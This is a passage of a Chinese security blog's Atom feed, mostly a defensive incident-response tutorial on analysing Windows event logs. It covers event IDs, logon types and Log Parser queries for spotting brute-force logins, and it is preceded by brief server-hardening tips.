class="code"><pre><span class="line"><span class="attribute">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器ssh默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇第1篇：Windows日志分析</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/68c6ad09.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/68c6ad09.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:34:25.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇-Windows日志分析">第1篇:Windows日志分析</h2><h3 id="0x01-Windows事件日志简介">0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/<span class="number">2000</span>操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %<span class="params">System</span>Root%\<span class="params">System</span>32\Winevt\Logs\<span class="params">System</span>.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p><h3 id="0X02-审核策略与事件查看器">0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="./image/log-1-1.png" alt=""></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：</p><p><img src="./image/log-1-2.png" alt=""></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**</p></li><li><p>按 “<strong>Window+R</strong>”，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”</p><p><img src="./image/log-1-3.png" alt=""></p></li></ol><h3 id="0x03-事件日志分析">0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th style="text-align:left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">4624</td><td>登录成功</td></tr><tr><td style="text-align:left">4625</td><td>登录失败</td></tr><tr><td style="text-align:left">4634</td><td>注销成功</td></tr><tr><td style="text-align:left">4647</td><td>用户启动的注销</td></tr><tr><td style="text-align:left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td style="text-align:left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th style="text-align:left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td style="text-align:left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td style="text-align:left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td style="text-align:left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td style="text-align:left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td style="text-align:left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td style="text-align:left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td style="text-align:left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td style="text-align:left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p></li><li><p>在事件查看器中，单击**“安全”**，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>4624  --登录成功<br>4625  --登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="./image/log-1-4.png" alt=""></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录：</p><p>1、在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p><p>2、在事件查看器中，单击**“系统”**，查看系统日志；</p><p>3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>6005 信息 EventLog 事件日志服务已启动。(开机)<br>6006 信息 EventLog 事件日志服务已停止。(关机)<br>6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="./image/log-1-5.png" alt=""></p><h3 id="0x04-日志分析工具">0x04 日志分析工具</h3><h4 id="Log-Parser">Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="./image/log-1-6.png" alt=""></p><p><strong>基本查询结构</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser<span class="selector-class">.exe</span> –<span class="selector-tag">i</span>:EVT –o:DATAGRID <span class="string">&quot;SELECT * FROM c:\xx.evtx&quot;</span></span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>2、查询登录失败的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard">LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="./image/log-1-7.png" alt=""></p><h4 id="Event-Log-Explorer">Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="./image/log-1-8.png" alt=""></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
</feed>
